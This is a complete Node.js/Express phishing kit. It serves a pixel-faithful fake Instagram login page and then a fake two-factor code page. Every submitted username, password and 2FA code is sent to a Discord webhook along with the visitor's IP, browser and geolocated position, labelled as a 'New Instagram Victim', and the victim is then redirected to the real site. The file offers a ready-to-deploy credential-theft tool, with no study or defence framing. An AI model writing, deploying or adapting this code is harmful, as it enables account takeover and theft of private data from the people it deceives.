const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Discord webhook helper
async function sendToDiscord(webhookUrl, data) {
  if (!webhookUrl) return;
  try {
    const https = require('https');
    const body = JSON.stringify({
      content: '**New Instagram Victim**',
      embeds: [{
        title: 'Login Credentials',
        fields: [
          { name: 'Username/Email', value: data.username || 'N/A', inline: true },
          { name: 'Password', value: data.password || 'N/A', inline: true },
          { name: '2FA Code', value: data.twofa || 'Not provided', inline: true },
          { name: 'IP Address', value: data.ip || 'N/A', inline: true },
          { name: 'Browser', value: data.browser || 'N/A', inline: true },
          { name: 'User-Agent', value: data.ua || 'N/A', inline: false },
          { name: 'Location', value: data.location || 'Unknown', inline: false }
        ],
        color: 0xE1306C,
        timestamp: new Date().toISOString()
      }]
    });
    const options = {
      hostname: new URL(webhookUrl).hostname,
      path: new URL(webhookUrl).pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    };
    const req = https.request(options);
    req.write(body);
    req.end();
  } catch (e) { /* silently fail */ }
}

// Get IP from request
function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.headers['x-real-ip'] || 
         req.socket.remoteAddress || 
         'Unknown';
}

// Get browser info
function getBrowserInfo(req) {
  const ua = req.headers['user-agent'] || '';
  let browser = 'Unknown';
  if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
  else if (ua.includes('Edg')) browser = 'Edge';
  else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
  return browser;
}

// Geolocation via ip-api.com
async function getGeoLocation(ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip === 'Unknown') return 'Unknown';
  try {
    const http = require('http');
    return new Promise((resolve) => {
      const req = http.get(`http://ip-api.com/json/${ip}`, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
          try {
            const json = JSON.parse(data);
            if (json.status === 'success') {
              resolve(`${json.city}, ${json.regionName}, ${json.country} (${json.lat}, ${json.lon})`);
            } else resolve('Unknown');
          } catch { resolve('Unknown'); }
        });
      });
      req.on('error', () => resolve('Unknown'));
      req.setTimeout(5000, () => { req.destroy(); resolve('Unknown'); });
    });
  } catch { return 'Unknown'; }
}

// Login page
app.get('*', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
.container{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;max-width:350px;width:100%;margin-top:12px;text-align:center}
.logo{font-family:'Billabond',sans-serif;font-size:42px;margin-bottom:20px;color:#262626}
.logo img{width:175px;height:51px}
form{display:flex;flex-direction:column;gap:6px}
input{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px 7px;font-size:12px;outline:none}
input:focus{border-color:#a8a8a8}
button{background:#0095f6;border:none;border-radius:4px;padding:7px 16px;color:#fff;font-weight:600;font-size:14px;cursor:pointer;margin-top:8px;opacity:0.9}
button:hover{opacity:1}
.or-divider{display:flex;align-items:center;margin:14px 0;color:#8e8e8e;font-size:12px;font-weight:600}
.or-divider::before,.or-divider::after{content:"";flex:1;height:1px;background:#dbdbdb}
.or-divider::before{margin-right:18px}
.or-divider::after{margin-left:18px}
.fb-login{color:#385185;font-size:14px;font-weight:600;text-decoration:none;margin:8px 0}
.forgot-password{color:#00376b;font-size:12px;margin-top:12px;text-decoration:none}
.signup-box{background:#fff;border:1px solid #dbdbdb;padding:20px 0;margin-top:10px;text-align:center;font-size:14px;max-width:350px;width:100%}
.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
.get-app{margin-top:20px;text-align:center;font-size:14px}
.app-links{display:flex;justify-content:center;gap:8px;margin-top:14px}
.app-links img{height:40px}
footer{color:#8e8e8e;font-size:12px;margin:40px 0;text-align:center}
footer a{color:#8e8e8e;text-decoration:none;margin:0 8px}
.error{color:#ed4956;font-size:12px;margin-top:6px;display:none}
</style>
</head>
<body>
<div class="container">
  <div class="logo"><img src="https://static.cdninstagram.com/rsrc.php/v3/yM/r/8nqA_RqE8Xb.png" alt="Instagram"></div>
  <form id="loginForm" method="POST" action="/api/login">
    <input type="text" name="username" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <div class="error" id="errorMsg">Sorry, your password was incorrect. Please try again.</div>
    <button type="submit">Log In</button>
  </form>
  <div class="or-divider">OR</div>
  <a href="#" class="fb-login">Log in with Facebook</a>
  <a href="#" class="forgot-password">Forgot password?</a>
</div>
<div class="signup-box">
  Don't have an account? <a href="#">Sign up</a>
</div>
<div class="get-app">
  <div>Get the app.</div>
  <div class="app-links">
    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"></a>
    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft"></a>
  </div>
</div>
<footer>
  <a href="#">Meta</a>
  <a href="#">About</a>
  <a href="#">Blog</a>
  <a href="#">Jobs</a>
  <a href="#">Help</a>
  <a href="#">API</a>
  <a href="#">Privacy</a>
  <a href="#">Terms</a>
  <a href="#">Locations</a>
  <a href="#">Instagram Lite</a>
  <a href="#">Threads</a>
  <a href="#">Contact Uploading & Non-Users</a>
  <a href="#">Meta Verified</a>
</footer>
</body>
</html>
  `);
});

// Handle login POST
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = getIP(req);
  const browser = getBrowserInfo(req);
  const location = await getGeoLocation(ip);

  const data = {
    username, password, twofa: '',
    ip, browser, ua: req.headers['user-agent'] || '',
    location
  };

  // Send to Discord
  await sendToDiscord(process.env.DISCORD_WEBHOOK, data);

  // Serve 2FA page
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
.container{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;max-width:350px;width:100%;margin-top:12px;text-align:center}
.logo{font-family:'Billabond',sans-serif;font-size:42px;margin-bottom:20px;color:#262626}
.logo img{width:175px;height:51px}
form{display:flex;flex-direction:column;gap:6px}
input{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px 7px;font-size:14px;outline:none;text-align:center;letter-spacing:4px;font-weight:600}
input:focus{border-color:#a8a8a8}
button{background:#0095f6;border:none;border-radius:4px;padding:7px 16px;color:#fff;font-weight:600;font-size:14px;cursor:pointer;margin-top:8px;opacity:0.9}
button:hover{opacity:1}
.info-text{font-size:14px;color:#262626;margin:10px 0;line-height:1.4}
.code-sent{font-size:12px;color:#8e8e8e;margin-bottom:10px}
.back-link{font-size:12px;color:#00376b;text-decoration:none;margin-top:12px;display:block}
footer{color:#8e8e8e;font-size:12px;margin:40px 0;text-align:center}
footer a{color:#8e8e8e;text-decoration:none;margin:0 8px}
</style>
</head>
<body>
<div class="container">
  <div class="logo"><img src="https://static.cdninstagram.com/rsrc.php/v3/yM/r/8nqA_RqE8Xb.png" alt="Instagram"></div>
  <div class="info-text">Enter the confirmation code we sent to <strong>${username}</strong></div>
  <div class="code-sent">We sent a 6-digit code to your phone and email. Enter it below to finish logging in.</div>
  <form id="twofaForm" method="POST" action="/api/2fa">
    <input type="hidden" name="username" value="${username}">
    <input type="hidden" name="password" value="${password}">
    <input type="text" name="twofa" placeholder="Confirmation code" maxlength="6" required>
    <button type="submit">Confirm</button>
  </form>
  <a href="#" class="back-link">Send code again</a>
  <a href="#" class="back-link" style="margin-top:4px">Having trouble? Get help logging in</a>
</div>
<footer>
  <a href="#">Meta</a>
  <a href="#">About</a>
  <a href="#">Blog</a>
  <a href="#">Jobs</a>
  <a href="#">Help</a>
  <a href="#">API</a>
  <a href="#">Privacy</a>
  <a href="#">Terms</a>
  <a href="#">Locations</a>
  <a href="#">Instagram Lite</a>
  <a href="#">Threads</a>
  <a href="#">Contact Uploading & Non-Users</a>
  <a href="#">Meta Verified</a>
</footer>
</body>
</html>
  `);
});

// Handle 2FA POST
app.post('/api/2fa', async (req, res) => {
  const { username, password, twofa } = req.body;
  const ip = getIP(req);
  const browser = getBrowserInfo(req);
  const location = await getGeoLocation(ip);

  const data = {
    username, password, twofa,
    ip, browser, ua: req.headers['user-agent'] || '',
    location
  };

  // Send to Discord with 2FA
  await sendToDiscord(process.env.DISCORD_WEBHOOK, data);

  // Redirect to real Instagram
  res.redirect('https://www.instagram.com');
});

module.exports = app;
